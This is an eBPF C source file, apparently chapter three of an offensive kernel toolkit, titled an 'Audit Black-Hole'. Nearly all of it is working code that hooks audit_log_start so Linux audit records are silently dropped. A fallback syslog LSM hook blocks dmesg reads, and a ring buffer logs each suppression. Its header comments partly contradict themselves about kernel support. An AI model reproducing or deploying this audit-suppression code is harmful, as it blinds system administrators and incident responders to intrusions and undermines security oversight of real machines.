// ch03 FUSE Audit Black-Hole — REAL mutation via fentry + bpf_modify_return.
//
// Two programs are compiled; loader picks one at runtime based on BTF
// introspection of the kernel's modify-return allowlist:
//
//  1) SEC("fmod_ret/audit_log_start") — preferred. Returning NULL causes
//     audit callers (audit_log, audit_log_end, etc.) to early-exit with
//     no audit buffer, fully suppressing the record.
//
//     audit_log_start was added to the bpf_modify_return allowlist via
//     BTF_SET_START(bpf_modify_return_targets) extension. As of the
//     mainline tree through 6.8, `audit_log_start` is NOT in the
//     upstream modify-return BTF set; distros that backport the
//     audit-suppression patch (or future kernels that extend the set)
//     can use this path. The loader checks at runtime and refuses to
//     attach if the symbol is absent from the allowlist.
//
//  2) SEC("lsm.s/syslog") — fallback. fmod_ret on the syslog LSM hook
//     denies dmesg-channel audit-adjacent reads (SYSLOG_ACTION_READ_ALL
//     and friends). Narrower scope than suppressing audit records, but
//     works on any CONFIG_BPF_LSM=y kernel without touching the
//     modify-return allowlist.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define EPERM 1

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    int hook;      // 1=audit_log_start, 2=syslog
    int suppressed;
    int type;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1);
} enabled SEC(".maps");

static __always_inline int is_enabled(void)
{
    unsigned int k = 0;
    unsigned int *v = bpf_map_lookup_elem(&enabled, &k);
    return v && *v;
}

static __always_inline void emit(int hook, int suppressed, int type)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->hook = hook;
    e->suppressed = suppressed;
    e->type = type;
    bpf_ringbuf_submit(e, 0);
}

// Primary: fmod_ret on audit_log_start.
// Signature: struct audit_buffer *audit_log_start(struct audit_context *ctx,
//                                                 gfp_t gfp_mask, int type)
// Returning NULL makes the caller treat "no memory / skip" — no record.
SEC("fmod_ret/audit_log_start")
int BPF_PROG(mr_audit_log_start, struct audit_context *actx, unsigned int gfp, int type,
             struct audit_buffer *ret)
{
    (void)actx; (void)gfp; (void)ret;
    if (!is_enabled())
        return (long)ret;
    emit(1, 1, type);
    return 0; // NULL — audit_log_start "returned" no buffer
}

// Fallback: fmod_ret on security_syslog.
// Signature: int security_syslog(int type)
// Returning -EPERM denies SYSLOG_ACTION_* — dmesg-channel audit peek is
// blocked. Narrower than full audit record suppression but widely
// available (any CONFIG_BPF_LSM=y kernel).
SEC("lsm.s/syslog")
int BPF_PROG(lsm_syslog, int type, int ret)
{
    if (!is_enabled())
        return ret;
    if (ret != 0)
        return ret;
    emit(2, 1, type);
    return -EPERM;
}
